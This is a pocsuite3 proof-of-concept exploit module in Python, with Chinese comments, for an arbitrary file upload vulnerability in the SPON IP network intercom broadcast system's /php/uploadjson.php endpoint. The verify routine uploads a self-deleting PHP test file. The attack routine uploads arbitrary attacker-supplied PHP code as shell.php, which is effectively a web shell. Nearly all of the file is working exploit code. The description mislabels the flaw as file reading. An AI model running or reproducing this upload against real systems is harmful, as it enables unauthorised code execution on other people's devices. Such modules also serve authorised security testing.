from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-08-24'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-08-24'  # 编写 PoC 的日期
    updateDate = '2021-08-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'SPON IP网络对讲广播系统 uploadjson.php 任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'IP网络对讲广播系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        世邦通信股份有限公司 SPON IP网络对讲广播系统 /php/uploadjson.php 页面存在任意文件读取  
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack --code '代码'
    验证时会上传shell.php 访问一次后自动删除，不对系统照成影响
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["code"] = OptString(default='<?php echo md5(233);unlink(__FILE__);?>',description='输入需要上传的代码',require=False)
        return o

    def _verify(self):
        result = {}
        path = "/php/uploadjson.php"
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        url = self.url + path
        data='jsondata[filename]=shell.php&jsondata[data]=<?php echo md5(233);unlink(__FILE__);?>'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            resq_results=requests.get(url=self.url+'/lan/shell.php')
            if "e165421110ba03099a1c0393373c5b43" in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
                result['VerifyInfo']['path'] = self.url+'/lan/shell.php'
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        code = self.get_option("code")
        path = "/php/uploadjson.php"
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        url = self.url + path
        data=f'jsondata[filename]=shell.php&jsondata[data]={code}'
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
            print('File Path >>> ' + f'{self.url}/php/shell.php')
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)